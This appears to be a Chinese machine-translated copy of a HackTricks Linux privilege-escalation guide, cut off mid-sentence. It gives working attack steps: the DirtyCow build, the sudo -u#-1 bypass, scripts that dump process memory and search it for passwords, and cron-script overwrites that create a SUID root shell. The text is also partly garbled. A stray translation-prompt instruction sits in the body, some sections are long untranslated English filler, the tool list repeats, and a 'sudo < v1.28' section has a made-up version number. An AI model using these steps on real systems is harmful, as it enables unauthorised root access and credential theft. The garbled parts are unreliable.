# Linux提权

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云平台 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch直播 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube频道 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获得[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram群组**](https://t.me/peass) 或 **关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **通过向** [**hacktricks仓库**](https://github.com/carlospolop/hacktricks) **和** [**hacktricks-cloud仓库**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>

## 系统信息

### 操作系统信息

让我们开始了解正在运行的操作系统的一些信息。
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### 路径

如果你**对`PATH`变量中的任何文件夹具有写权限**，你可能能够劫持一些库或二进制文件：
```bash
echo $PATH
```
### 环境信息

环境变量中是否包含有趣的信息、密码或API密钥？
```bash
(env || set) 2>/dev/null
```
### 内核漏洞利用

检查内核版本，以及是否存在可以用于提升权限的漏洞。
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
您可以在此处找到一份良好的易受攻击的内核列表和一些已经编译好的漏洞利用程序：[https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) 和 [exploitdb sploits](https://github.com/offensive-security/exploitdb-bin-sploits/tree/master/bin-sploits)。
其他一些可以找到一些已编译好的漏洞利用程序的网站：[https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries)，[https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

要从该网站提取所有易受攻击的内核版本，您可以执行以下操作：
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
以下是一本关于黑客技术的书籍中的内容。以下内容来自文件linux-hardening/privilege-escalation/README.md。将相关的英文文本翻译成中文，并返回翻译结果，保持完全相同的markdown和html语法。不要翻译代码、黑客技术名称、黑客术语、云/SaaS平台名称（如Workspace、aws、gcp...）、泄漏一词、渗透测试和markdown标签。此外，请不要添加任何额外的内容，只需翻译和markdown语法即可。

工具可以帮助搜索内核漏洞的有：

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)（仅在受害者中执行，仅检查内核2.x的漏洞）

始终**在Google中搜索内核版本**，也许你的内核版本在某个内核漏洞中被提及，这样你就可以确定该漏洞是否有效。

### CVE-2016-5195（DirtyCow）

Linux特权提升 - Linux内核 <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo版本

基于出现的有漏洞的sudo版本：
```bash
searchsploit sudo
```
您可以使用以下grep命令检查sudo版本是否存在漏洞。
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### sudo < v1.28

来自 @sickrov

#### 漏洞描述

在sudo版本1.28之前的版本中存在一个特权升级漏洞。该漏洞允许未经授权的用户通过滥用sudo的特权执行命令，从而提升其权限。

#### 漏洞利用

攻击者可以利用以下方法利用该漏洞：

1. 使用已知的特权升级漏洞，如CVE-2019-14287，该漏洞允许非特权用户通过使用"!"字符来绕过sudo的限制。

   ```bash
   $ sudo -u#-1 /bin/bash
   ```

2. 利用sudoers文件中的配置错误，如允许非特权用户执行特权命令的配置错误。

   ```bash
   $ sudo -l
   $ sudo -u#-1 /usr/bin/sudoedit /etc/sudoers
   ```

#### 漏洞修复

升级sudo到1.28或更高版本，以修复该漏洞。确保及时应用安全补丁以保护系统免受潜在的特权升级攻击。
```
sudo -u#-1 /bin/bash
```
### Dmesg签名验证失败

请查看**HTB的smasher2 box**，以了解如何利用此漏洞的**示例**。
```bash
dmesg 2>/dev/null | grep "signature"
```
### 更多系统枚举

In addition to the basic system enumeration techniques mentioned earlier, there are several other methods that can be used to gather information about a target system. These techniques can help in identifying potential vulnerabilities and privilege escalation opportunities.

#### 1. Process Enumeration

By enumerating the running processes on a system, you can identify any processes that are running with elevated privileges or are associated with vulnerable services. This can provide valuable information for privilege escalation.

To enumerate processes on a Linux system, you can use the `ps` command with various options. For example, `ps aux` will display a detailed list of all running processes, including the user and command associated with each process.

#### 2. Network Enumeration

Network enumeration involves gathering information about the network interfaces, open ports, and active connections on a system. This can help in identifying potential entry points and services that may be vulnerable to attack.

To enumerate network information on a Linux system, you can use tools like `netstat` or `ss`. For example, `netstat -tuln` will display a list of all listening TCP and UDP ports, along with the associated processes.

#### 3. File System Enumeration

Enumerating the file system can provide insights into the directory structure, permissions, and sensitive files on a system. This can help in identifying misconfigurations or files that can be leveraged for privilege escalation.

To enumerate the file system on a Linux system, you can use commands like `ls`, `find`, or `tree`. For example, `ls -la` will display a detailed list of all files and directories, including their permissions.

#### 4. Service Enumeration

Service enumeration involves identifying the services running on a system and gathering information about their versions, configurations, and potential vulnerabilities. This can help in identifying weak points that can be exploited for privilege escalation.

To enumerate services on a Linux system, you can use tools like `nmap` or `enum4linux`. For example, `nmap -sV <target>` will perform a version scan of all open ports on the target system.

#### 5. User Enumeration

User enumeration involves gathering information about the users and groups on a system. This can help in identifying privileged accounts or misconfigured permissions that can be exploited for privilege escalation.

To enumerate users on a Linux system, you can use commands like `id`, `cat /etc/passwd`, or `getent passwd`. For example, `cat /etc/passwd` will display a list of all user accounts on the system.

By combining these system enumeration techniques with the previously mentioned techniques, you can gather a comprehensive understanding of the target system and identify potential vulnerabilities and privilege escalation opportunities.
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
### 枚举可能的防御措施

### AppArmor

AppArmor是一个Linux内核安全模块，用于限制应用程序的访问权限。它通过定义应用程序的访问规则来保护系统免受潜在的攻击。AppArmor可以防止特权升级攻击，限制应用程序的权限，从而减少潜在的漏洞利用风险。要枚举AppArmor的防御措施，可以考虑以下几点：

- 检查系统中是否已启用AppArmor。可以使用命令`sudo apparmor_status`来查看AppArmor的状态。
- 确保所有关键应用程序都已配置适当的AppArmor规则。可以使用命令`sudo aa-status`来查看已加载的AppArmor配置文件。
- 定期更新和审查AppArmor规则，以确保其与最新的安全标准保持一致。
- 监控AppArmor日志，及时发现和应对任何违规行为。

通过枚举AppArmor的防御措施，可以增强系统的安全性，减少特权升级攻击的风险。
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity

Grsecurity是一个Linux内核补丁，旨在增强系统的安全性和防御能力。它提供了一系列的安全功能，包括访问控制、内存保护、进程隔离和特权升级防护。通过应用Grsecurity补丁，可以有效地减少系统遭受攻击的风险，并提供更高的安全性。

#### 特权升级

特权升级是指攻击者通过利用系统中的漏洞，从低权限用户提升为高权限用户的过程。Grsecurity提供了一些功能来防止特权升级攻击，包括：

- **不可执行内存保护（NX）**：禁止将内存区域用作可执行代码，防止攻击者在内存中注入和执行恶意代码。
- **地址空间布局随机化（ASLR）**：随机化内存中的地址空间布局，使攻击者难以确定特定代码和数据的位置。
- **堆栈保护**：检测和防止堆栈溢出攻击，防止攻击者利用溢出的缓冲区来执行恶意代码。
- **特权分离**：限制特权进程的权限，防止攻击者利用特权进程来执行恶意操作。

通过使用Grsecurity的特权升级防护功能，可以大大降低系统受到特权升级攻击的风险，提高系统的安全性。

#### 安全增强

除了特权升级防护功能外，Grsecurity还提供了其他安全增强功能，包括：

- **访问控制**：通过强制访问控制规则，限制用户和进程对系统资源的访问权限。
- **进程隔离**：将不同的进程隔离开来，防止恶意进程对其他进程和系统造成影响。
- **系统调用过滤**：限制系统调用的使用，防止恶意代码利用系统调用来执行攻击。
- **安全审计**：记录系统中的安全事件和活动，以便进行后续的审计和调查。

通过应用Grsecurity补丁，可以增强系统的安全性，并提供更强大的防御能力，以应对各种攻击和威胁。
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX

PaX是一个Linux内核补丁，旨在增强系统的安全性。它通过实施内存保护措施来防止各种攻击，如缓冲区溢出和代码注入。PaX提供了一系列功能，包括不可执行（NX）内存、地址空间布局随机化（ASLR）和堆栈保护。

#### 不可执行（NX）内存

NX内存是一种内存保护机制，它阻止恶意代码在可执行内存区域执行。通过将内存标记为不可执行，PaX可以防止攻击者利用缓冲区溢出漏洞注入和执行恶意代码。

#### 地址空间布局随机化（ASLR）

ASLR是一种安全技术，通过随机化内存地址的分配，使攻击者难以确定特定代码或数据的位置。PaX的ASLR功能可以防止攻击者利用已知的内存地址来执行攻击。

#### 堆栈保护

堆栈保护是一种防御措施，用于防止堆栈溢出攻击。PaX的堆栈保护功能可以检测和阻止堆栈溢出，并防止攻击者覆盖关键数据或执行恶意代码。

总之，PaX是一个强大的内核补丁，可以提供多种保护措施，增强Linux系统的安全性。通过使用PaX，可以有效防止各种攻击，保护系统和数据的安全。
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield

Execshield是一种用于增强Linux系统安全性的内核功能。它通过限制可执行文件的内存区域来防止缓冲区溢出攻击。Execshield通过使用地址空间布局随机化（ASLR）和栈随机化来保护系统免受恶意代码的利用。

ASLR是一种安全机制，它在每次启动时随机分配可执行文件和共享库的内存地址，使攻击者难以预测这些地址。这样，即使攻击者成功利用了一个漏洞，也很难确定要攻击的内存位置。

栈随机化是一种防御措施，它在每次函数调用时随机分配栈的内存地址。这使得攻击者难以利用栈溢出漏洞来执行恶意代码。

通过启用Execshield，可以有效地减少系统受到缓冲区溢出攻击的风险，提高系统的安全性。要启用Execshield，可以在Linux系统上进行相应的配置和设置。
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux

SElinux（Security-Enhanced Linux）是一种安全增强的Linux操作系统安全机制。它通过强制访问控制（MAC）来限制进程的权限，从而提供了更高的系统安全性。

在Linux系统中，每个进程都有一个安全上下文（security context），它包含了进程的标签和角色。SElinux使用这些标签和角色来控制进程对系统资源的访问权限。

SElinux提供了三种模式：强制模式（Enforcing）、宽容模式（Permissive）和禁用模式（Disabled）。在强制模式下，SElinux会严格限制进程的权限，而在宽容模式下，它只会记录违规行为而不会阻止。禁用模式下，SElinux完全关闭。

为了提高系统的安全性，我们可以采取一些措施来加强SElinux的配置。这些措施包括：

- 定期更新SElinux策略
- 限制进程的访问权限
- 配置SElinux日志记录
- 使用SElinux工具进行故障排除和分析

通过正确配置和使用SElinux，我们可以有效地提高Linux系统的安全性，防止特权升级和其他安全漏洞的利用。
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
ASLR (Address Space Layout Randomization) 是一种操作系统的安全机制，用于防止恶意攻击者利用内存地址的可预测性进行攻击。ASLR 通过随机化程序的内存布局，使得攻击者无法准确预测代码和数据的位置。这种随机化使得攻击者更难利用内存漏洞进行特定的攻击，例如缓冲区溢出。ASLR 是一种重要的特性，可以增加系统的安全性，减少潜在的攻击面。
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker逃逸

如果你在一个Docker容器内部，你可以尝试逃离它：

{% content-ref url="docker-security/" %}
[docker-security](docker-security/)
{% endcontent-ref %}

## 驱动器

检查已挂载和未挂载的驱动器，以及它们的位置和原因。如果有任何未挂载的驱动器，你可以尝试挂载它并检查是否存在私人信息。
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## 有用的软件

列举有用的二进制文件

```markdown
- [**find**](https://man7.org/linux/man-pages/man1/find.1.html): A powerful command-line tool for searching files and directories.
- [**grep**](https://man7.org/linux/man-pages/man1/grep.1.html): A command-line utility for searching text patterns in files.
- [**awk**](https://man7.org/linux/man-pages/man1/awk.1.html): A versatile programming language for manipulating text files.
- [**sed**](https://man7.org/linux/man-pages/man1/sed.1.html): A stream editor for filtering and transforming text.
- [**curl**](https://man7.org/linux/man-pages/man1/curl.1.html): A command-line tool for making HTTP requests.
- [**wget**](https://man7.org/linux/man-pages/man1/wget.1.html): A command-line utility for downloading files from the web.
- [**nc**](https://man7.org/linux/man-pages/man1/nc.1.html): A utility for reading and writing data across network connections.
- [**nmap**](https://nmap.org/): A powerful network scanning tool.
- [**tcpdump**](https://www.tcpdump.org/manpages/tcpdump.1.html): A command-line packet analyzer.
- [**wireshark**](https://www.wireshark.org/): A popular network protocol analyzer.
- [**ps**](https://man7.org/linux/man-pages/man1/ps.1.html): A command-line utility for displaying information about running processes.
- [**top**](https://man7.org/linux/man-pages/man1/top.1.html): A command-line tool for monitoring system processes.
- [**lsof**](https://man7.org/linux/man-pages/man8/lsof.8.html): A command-line utility for listing open files and processes.
- [**strace**](https://man7.org/linux/man-pages/man1/strace.1.html): A debugging tool for tracing system calls and signals.
- [**sudo**](https://man7.org/linux/man-pages/man8/sudo.8.html): A command-line utility for executing commands as another user.
- [**su**](https://man7.org/linux/man-pages/man1/su.1.html): A command-line utility for switching to another user account.
- [**chroot**](https://man7.org/linux/man-pages/man2/chroot.2.html): A command-line utility for changing the root directory for a process.
- [**chmod**](https://man7.org/linux/man-pages/man1/chmod.1.html): A command-line utility for changing file permissions.
- [**chown**](https://man7.org/linux/man-pages/man1/chown.1.html): A command-line utility for changing file ownership.
- [**chgrp**](https://man7.org/linux/man-pages/man1/chgrp.1.html): A command-line utility for changing group ownership of files.
- [**passwd**](https://man7.org/linux/man-pages/man1/passwd.1.html): A command-line utility for changing user passwords.
- [**useradd**](https://man7.org/linux/man-pages/man8/useradd.8.html): A command-line utility for creating user accounts.
- [**usermod**](https://man7.org/linux/man-pages/man8/usermod.8.html): A command-line utility for modifying user accounts.
- [**groupadd**](https://man7.org/linux/man-pages/man8/groupadd.8.html): A command-line utility for creating groups.
- [**groupmod**](https://man7.org/linux/man-pages/man8/groupmod.8.html): A command-line utility for modifying groups.
- [**userdel**](https://man7.org/linux/man-pages/man8/userdel.8.html): A command-line utility for deleting user accounts.
- [**groupdel**](https://man7.org/linux/man-pages/man8/groupdel.8.html): A command-line utility for deleting groups.
- [**crontab**](https://man7.org/linux/man-pages/man1/crontab.1.html): A command-line utility for managing cron jobs.
- [**at**](https://man7.org/linux/man-pages/man1/at.1.html): A command-line utility for scheduling one-time tasks.
- [**ssh**](https://man7.org/linux/man-pages/man1/ssh.1.html): A secure shell client for remote login.
- [**scp**](https://man7.org/linux/man-pages/man1/scp.1.html): A command-line utility for securely copying files between hosts.
- [**rsync**](https://man7.org/linux/man-pages/man1/rsync.1.html): A fast and versatile file synchronization tool.
- [**tar**](https://man7.org/linux/man-pages/man1/tar.1.html): A command-line utility for archiving files.
- [**gzip**](https://man7.org/linux/man-pages/man1/gzip.1.html): A command-line utility for compressing files.
- [**gunzip**](https://man7.org/linux/man-pages/man1/gunzip.1.html): A command-line utility for decompressing files.
- [**zip**](https://man7.org/linux/man-pages/man1/zip.1.html): A command-line utility for creating ZIP archives.
- [**unzip**](https://man7.org/linux/man-pages/man1/unzip.1.html): A command-line utility for extracting files from ZIP archives.
- [**openssl**](https://www.openssl.org/): A robust open-source toolkit for SSL/TLS protocols.
- [**gpg**](https://gnupg.org/): A command-line tool for encryption and digital signatures.
- [**john**](https://www.openwall.com/john/): A password cracker for Unix-like systems.
- [**hydra**](https://github.com/vanhauser-thc/thc-hydra): A powerful online password cracking tool.
- [**hashcat**](https://hashcat.net/hashcat/): An advanced password recovery tool.
- [**johnny**](https://github.com/shinnok/johnny): A GUI for the John the Ripper password cracker.
- [**sqlmap**](http://sqlmap.org/): An automatic SQL injection and database takeover tool.
- [**metasploit**](https://www.metasploit.com/): A powerful penetration testing framework.
- [**nmap**](https://nmap.org/): A versatile network scanning tool.
- [**nikto**](https://cirt.net/Nikto2): A web server vulnerability scanner.
- [**wpscan**](https://wpscan.org/): A WordPress vulnerability scanner.
- [**sqlninja**](https://sqlninja.sourceforge.net/): A SQL server injection and takeover tool.
- [**aircrack-ng**](https://www.aircrack-ng.org/): A suite of Wi-Fi network security tools.
- [**reaver**](https://github.com/t6x/reaver-wps-fork-t6x): A WPS-enabled wireless network attack tool.
- [**ettercap**](https://ettercap.github.io/ettercap/): A comprehensive suite for man-in-the-middle attacks.
- [**tcpdump**](https://www.tcpdump.org/): A command-line packet analyzer.
- [**wireshark**](https://www.wireshark.org/): A popular network protocol analyzer.
- [**burpsuite**](https://portswigger.net/burp): A web application security testing tool.
- [**owasp-zap**](https://www.zaproxy.org/): An open-source web application security scanner.
- [**dirb**](https://tools.kali.org/web-applications/dirb): A web content scanner.
- [**gobuster**](https://github.com/OJ/gobuster): A directory and DNS brute-forcing tool.
- [**sqlmap**](http://sqlmap.org/): An automatic SQL injection and database takeover tool.
- [**nikto**](https://cirt.net/Nikto2): A web server vulnerability scanner.
- [**wpscan**](https://wpscan.org/): A WordPress vulnerability scanner.
- [**sqlninja**](https://sqlninja.sourceforge.net/): A SQL server injection and takeover tool.
- [**aircrack-ng**](https://www.aircrack-ng.org/): A suite of Wi-Fi network security tools.
- [**reaver**](https://github.com/t6x/reaver-wps-fork-t6x): A WPS-enabled wireless network attack tool.
- [**ettercap**](https://ettercap.github.io/ettercap/): A comprehensive suite for man-in-the-middle attacks.
- [**tcpdump**](https://www.tcpdump.org/): A command-line packet analyzer.
- [**wireshark**](https://www.wireshark.org/): A popular network protocol analyzer.
- [**burpsuite**](https://portswigger.net/burp): A web application security testing tool.
- [**owasp-zap**](https://www.zaproxy.org/): An open-source web application security scanner.
- [**dirb**](https://tools.kali.org/web-applications/dirb): A web content scanner.
- [**gobuster**](https://github.com/OJ/gobuster): A directory and DNS brute-forcing tool.
```

以上是有关有用软件的列表。
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
此外，检查是否**安装了任何编译器**。如果您需要使用某些内核漏洞利用程序，这将非常有用，因为建议在您将要使用的机器上（或类似的机器上）编译它。
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### 已安装的易受攻击软件

检查**已安装软件包和服务的版本**。也许有一些旧的Nagios版本（例如）可能被利用来提升权限...\
建议手动检查更可疑的已安装软件的版本。
```bash
dpkg -l #Debian
rpm -qa #Centos
```
如果您可以通过SSH访问该机器，您还可以使用**openVAS**来检查机器内安装的过时和易受攻击的软件。

{% hint style="info" %}
_请注意，这些命令将显示大量大多数无用的信息，因此建议使用OpenVAS或类似的应用程序来检查是否安装的软件版本易受已知攻击的影响_
{% endhint %}

## 进程

查看正在执行的**进程**，并检查是否有任何进程具有**比应有的权限更高**（也许是由root执行的tomcat进程？）
```bash
ps aux
ps -ef
top -n 1
```
始终检查是否有可能运行[**electron/cef/chromium调试器**，您可以滥用它来提升权限](electron-cef-chromium-debugger-abuse.md)。**Linpeas**通过检查进程的命令行中的`--inspect`参数来检测这些调试器。\
还要**检查您对进程二进制文件的权限**，也许您可以覆盖其他用户的权限。

### 进程监控

您可以使用像[**pspy**](https://github.com/DominicBreuker/pspy)这样的工具来监控进程。这对于识别频繁执行的易受攻击的进程或满足一组要求时非常有用。

### 进程内存

服务器的一些服务在内存中以明文保存**凭据**。\
通常，您需要**root权限**才能读取属于其他用户的进程的内存，因此当您已经是root并且想要发现更多凭据时，这通常更有用。\
但是，请记住**作为普通用户，您可以读取自己拥有的进程的内存**。

{% hint style="warning" %}
请注意，现在大多数机器**默认不允许ptrace**，这意味着您无法转储属于您的非特权用户的其他进程。

文件_**/proc/sys/kernel/yama/ptrace\_scope**_控制ptrace的可访问性：

* **kernel.yama.ptrace\_scope = 0**：所有进程都可以进行调试，只要它们具有相同的uid。这是ptracing的经典方式。
* **kernel.yama.ptrace\_scope = 1**：只有父进程可以进行调试。
* **kernel.yama.ptrace\_scope = 2**：只有管理员可以使用ptrace，因为它需要CAP\_SYS\_PTRACE权限。
* **kernel.yama.ptrace\_scope = 3**：不允许使用ptrace跟踪任何进程。设置后，需要重新启动才能再次启用ptracing。
{% endhint %}

#### GDB

如果您可以访问FTP服务的内存（例如），您可以获取Heap并在其中搜索凭据。
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB脚本

{% code title="dump-memory.sh" %}
```bash
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
{% endcode %}

#### /proc/$pid/maps & /proc/$pid/mem

对于给定的进程ID，**maps文件显示了该进程的虚拟地址空间中的内存映射情况**；它还显示了每个映射区域的**权限**。**mem伪文件暴露了进程的内存本身**。通过**maps**文件，我们可以知道哪些**内存区域是可读的**以及它们的偏移量。我们利用这些信息来**在mem文件中定位并将所有可读的区域转储到一个文件中**。
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` 提供对系统的**物理**内存的访问，而不是虚拟内存。内核的虚拟地址空间可以使用 `/dev/kmem` 来访问。\
通常情况下，`/dev/mem` 只能被 **root** 和 **kmem** 组读取。
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump for Linux

ProcDump是Sysinternals工具套件中经典ProcDump工具的Linux版本。在[https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)获取它。
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### 工具

要转储进程内存，您可以使用以下工具：

* [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
* [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump)（需要 root 权限）- 您可以手动删除 root 权限要求，并转储您拥有的进程
* [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) 中的脚本 A.5（需要 root 权限）

### 从进程内存中获取凭据

#### 手动示例

如果您发现认证器进程正在运行：
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
您可以转储进程（请参阅前面的部分，了解转储进程内存的不同方法），并在内存中搜索凭据：
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

工具[**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin)可以从内存和一些**知名文件**中**窃取明文凭据**。它需要root权限才能正常工作。

| 功能                                               | 进程名称              |
| ------------------------------------------------- | -------------------- |
| GDM密码（Kali桌面，Debian桌面）                    | gdm-password         |
| Gnome Keyring（Ubuntu桌面，ArchLinux桌面）          | gnome-keyring-daemon |
| LightDM（Ubuntu桌面）                              | lightdm              |
| VSFTPd（活动FTP连接）                              | vsftpd               |
| Apache2（活动HTTP基本身份验证会话）                | apache2              |
| OpenSSH（活动SSH会话 - 使用sudo）                  | sshd:                |

#### 搜索正则表达式/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## 定时任务/计划任务

检查是否存在可利用的定时任务漏洞。也许你可以利用以root权限执行的脚本（通配符漏洞？可以修改root使用的文件吗？使用符号链接？在root使用的目录中创建特定文件？）。
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron路径

例如，在_/etc/crontab_文件中，你可以找到路径：_PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

（注意用户"user"对/home/user具有写权限）

如果在这个crontab中，root用户尝试执行一些没有设置路径的命令或脚本。例如：_\* \* \* \* root overwrite.sh_\
那么，你可以使用以下方法获取root shell：
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### 使用带有通配符的脚本的Cron（通配符注入）

如果一个由root执行的脚本中的命令中有“**\***”，你可以利用这个漏洞来执行意外的操作（如权限提升）。例如：
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**如果通配符前面有路径，比如** _**/some/path/\***_ **，它是不容易受到攻击的（甚至** _**./\***_ **也不容易受到攻击）。**

阅读以下页面以了解更多通配符利用技巧：

{% content-ref url="wildcards-spare-tricks.md" %}
[wildcards-spare-tricks.md](wildcards-spare-tricks.md)
{% endcontent-ref %}

### Cron脚本覆盖和符号链接

如果你**可以修改由root执行的cron脚本**，你可以非常容易地获得一个shell：
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
如果由root执行的脚本使用了**你拥有完全访问权限的目录**，也许删除该文件夹并**创建一个符号链接文件夹到另一个**由你控制的脚本可能会有用。
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### 频繁的定时任务

您可以监视进程，以搜索每1、2或5分钟执行一次的进程。也许您可以利用它来提升特权。

例如，要在1分钟内每0.1秒监视一次，按照执行次数较少的命令进行排序，并删除已执行最多次数的命令，您可以执行以下操作：
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**你也可以使用** [**pspy**](https://github.com/DominicBreuker/pspy/releases) （这将监视并列出每个启动的进程）。

### 隐形的cron任务

可以通过在注释后面**插入一个回车符**（没有换行符）来创建一个cron任务，这个cron任务将会生效。示例（注意回车符）：
```bash
